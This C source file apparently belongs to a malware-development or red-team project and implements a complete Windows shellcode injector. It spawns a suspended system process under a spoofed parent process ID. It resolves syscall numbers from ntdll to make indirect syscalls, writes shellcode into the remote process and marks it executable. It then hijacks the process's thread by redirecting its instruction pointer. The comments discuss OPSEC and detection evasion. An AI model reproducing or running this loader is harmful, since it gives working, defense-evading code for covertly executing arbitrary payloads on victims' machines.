#include "Threading.h"

#pragma warning (disable:4996)

BOOL CreateSuspendedProcess
(IN LPCSTR lpProcessName,
 OUT DWORD* dwProcessId,
 IN HANDLE hParent,
 OUT HANDLE* hProcess,
 OUT HANDLE* hThread)
{


	/*-----------------------------------------------------------------------------[Creating a Suspended Process]--------------------------------------------------*/


	CHAR lpPath[MAX_PATH * 2] = { 0 }; // This will store the full file path of notepad.exe
	CHAR WnDr[MAX_PATH] = { 0 }; //Holds the windows system directory path "C:\\Windows"

	SIZE_T                             sThreadAttList = NULL;
	LPPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

	STARTUPINFOEXA siEx = { 0 }; // info about how a new process should appear when calling functions
	PROCESS_INFORMATION pi = { 0 }; //receives info about newly created process

	RtlSecureZeroMemory(&siEx, sizeof(STARTUPINFOEXA)); // zeros out memory
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	/* Getting Path to execute program... */
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
	{
		WARN("GetEnvironmentVariableA Failed! With an Error: %d", GetLastError()); 
		return FALSE;
	}


	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);


	/*---------------------------------------------------------[PPID Spoofing]-----------------------------------------------------------------------*/


	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList); // setup the amount of buffer required

	pThreadAttList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList); // Allocate required memory
	if (pThreadAttList == NULL) {
		WARN("HeapAlloc Failed With Error : %d", GetLastError());
		return FALSE;
	}

	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) // Allocate the buffer
	{
		WARN("InitializeProcThreadAttributeList Failed With Error : %d", GetLastError());
		return FALSE;
	}


	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) // Update the list
	{
		WARN("UpdateProcThreadAttribute Failed With Error : %d", GetLastError());
		return FALSE;

	}

	/* Creating our suspended Process */
	siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	siEx.lpAttributeList = pThreadAttList;


	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi)) // Create a notepad process with specific features.
	{
		WARN("CreateProcessA Failed! With an Error: %d", GetLastError());
		return FALSE;
	}

	OKAY("Successfully Created a Suspended Process of %s", lpProcessName);


	*dwProcessId = pi.dwProcessId;
	*hProcess = pi.hProcess;
	*hThread = pi.hThread;


	DeleteProcThreadAttributeList(pThreadAttList);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;

}


/*---------------------------------------------------[Externally Calling our Functions via ASM]-----------------------------------------------------------------------*/



VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys)
{

	/*

		Something to note for this function, as of right now
		this function will use GetProcAddress and we will also
		use LoadLibrary in the next function.

		In terms of OPSEC, this is malpractice, and should be switched
		to a custom function.

		For the sake of simplicity it will say like this, but in future
		project, there will be a custom SSN retriver and PE module loader

	*/


	DWORD SyscallNumber = 0;

	UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };

	UINT_PTR NtFunctionAddress = 0;

	NtFunctionAddress = (UINT_PTR)GetProcAddress(mod, FuncName);
	if (NtFunctionAddress == 0)
	{
		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
		return;
	}

	BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];
	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
	*FuncSSN = (byte5 << 8) | byte4;

	*FuncSys = NtFunctionAddress + 0x12;


	if (memcmp(SyscallOpcodes, (PVOID)*FuncSys, sizeof(SyscallOpcodes)) == 0) {
		INFO("[0x%p] [0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, (PVOID)*FuncSys, *FuncSSN, FuncName);
		return;
	}

	else {
		WARN("expected syscall signature: \"0x0f05\" didn't match.");
		return;
	}


	/*

		courtesy of Crr0ww for this function, however
		in the future it will be better to not use these
		when calling the Syscalls :)

	*/


}



BOOL IndirectSyscallInjection
(IN HANDLE hProcess,
 IN PBYTE pShellcode,
 IN SIZE_T sSizeOfShellcode,
 OUT PVOID* ppAddress)

{

	SIZE_T sBytesWritten = NULL;
	DWORD dwOldProt = NULL;
	HMODULE    NtdllHandle = NULL;
	PVOID rBuffer = NULL;
	NTSTATUS STATUS = NULL;
	PUCHAR localBuf = NULL;
	SIZE_T origSize = sSizeOfShellcode;
	SIZE_T regionSize = sSizeOfShellcode;


	if (!hProcess || !pShellcode || sSizeOfShellcode == 0 || !ppAddress) {
		WARN("Invalid parameter to IndirectSyscallInjection");
		return FALSE;
	}


	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sSizeOfShellcode);
	if (!localBuf) {
		WARN("HeapAlloc failed");
		return FALSE;
	}
	memcpy(localBuf, pShellcode, sSizeOfShellcode);



	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}
	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);


	IndirectPrelude(NtdllHandle, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
	IndirectPrelude(NtdllHandle, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
	IndirectPrelude(NtdllHandle, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);

	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/

	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	printf("Allocated \n\\____[%zu] Bytes to Virtual Memory! \n", sSizeOfShellcode);

	/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/

	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}


	OKAY("Wrote %zu Bytes to Virtual Memory via Indirect Syscalls!", sSizeOfShellcode);

	/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/

	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Changed Allocation Protection from [RW] to [RX] Via Indirect Syscalls");

	*ppAddress = rBuffer;

	HeapFree(GetProcessHeap(), 0, localBuf);
	return TRUE;

}


BOOL HijackThread
(
	IN HANDLE hThread,
	IN PVOID pRemoteAddress
)

{

	HMODULE    NtdllHandle = NULL;
	NTSTATUS		STATUS = NULL;
	ULONG suspendedCount = 0;

	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;


	if (!hThread || hThread == INVALID_HANDLE_VALUE || !pRemoteAddress) {
		WARN("Invalid parameters to HijackThread");
		return FALSE;
	}


	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}

	IndirectPrelude(NtdllHandle, "NtGetContextThread", &fn_NtGetContextThreadSSN, &fn_NtGetContextThreadSyscall);
	IndirectPrelude(NtdllHandle, "NtSetContextThread", &fn_NtSetContextThreadSSN, &fn_NtSetContextThreadSyscall);
	IndirectPrelude(NtdllHandle, "NtResumeThread", &fn_NtResumeThreadSSN, &fn_NtResumeThreadSyscall);
	IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &fn_NtWaitForSingleObjectSSN, &fn_NtWaitForSingleObjectSyscall);


	STATUS = NtGetContextThread(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtGetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	OKAY("Successfully got Thread Context!");

	ThreadCtx.Rip = (DWORD64)pRemoteAddress;

	STATUS = NtSetContextThread(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtSetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	OKAY("Successfully set Thread Context!");

	STATUS = NtResumeThread(hThread, &suspendedCount);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtResumeThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	INFO("Resuming Thread....");

	STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWaitForSingleObject Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}


	INFO("Waiting for Thread to Finish Executing...");


	return TRUE;
}
